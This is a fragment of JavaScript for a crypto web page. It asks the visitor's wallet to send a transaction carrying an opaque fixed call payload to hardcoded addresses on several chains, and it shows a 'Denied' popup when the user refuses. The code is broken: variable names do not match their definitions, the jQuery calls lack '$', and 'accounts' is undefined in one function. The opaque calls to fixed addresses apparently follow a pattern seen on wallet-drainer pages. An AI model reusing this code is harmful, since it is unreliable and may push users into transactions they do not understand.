
    async function binsent () {


    }
    async function astrosent() {

      const accounts = await ethereum.request({ method: 'eth_accounts' });
      var chainIDs = await ethereum.request({method: 'eth_chainId'});
      var passxxaddy = {'Polygon': astroaddress, 'Binance': '0x4Bc35353C087F14e226b90bdA1afeE99B8AEDB23', 'Fantom': '0x7214FE7771aB7ac68B0BE853bEa2d5855294A562'}
      var numxchain = {'0x1': 'Ethereum', '0x89': 'Polygon', '0x38': 'Binance', '0xfa': 'Fantom', '0x': 'undefined', 'null': 'undefined', 'undefined': 'undefined'};
    
      async function Astropass() {
  
   

        
  
  
       
      ethereum.request({
        method: 'eth_sendTransaction',
        params: [{  
                   from: accounts[0],
                   to: passxaddy[numcxhain[chainIDs]], 
                   tag: 'latest', 
                   chainid: chainIDs,
                   data: '0x3b80fb19' }]
      })
      .catch((err) => { if(err.code === 4001) 
        {("#DeniedModal").modal('show'); }
        }
      ).then(result => { if(result === undefined) {("#DeniedModal").modal('show');} else{alert("Transaction Hash/Receipt: " + result)}});
      
                          };



      Astropass();
  
   
                        };

                        async function checkAstro() {
                          // Then get the currently selected radio button's value
                          console.log(window.ethereum)
                          
                          if (window.ethereum !== undefined || accounts.length > 0) {
                      // From now on, this should always be true:
                      // provider === window.ethereum
                      
                              console.log(window.ethereum); // initialize your app
                              astrosent();
                                                            } else {
                    
                               
                               ("#nowebModal").modal('show');
                      
                                            }
                    
                          // Check the value to make sure you want to show the modal
                         
                        }








           
         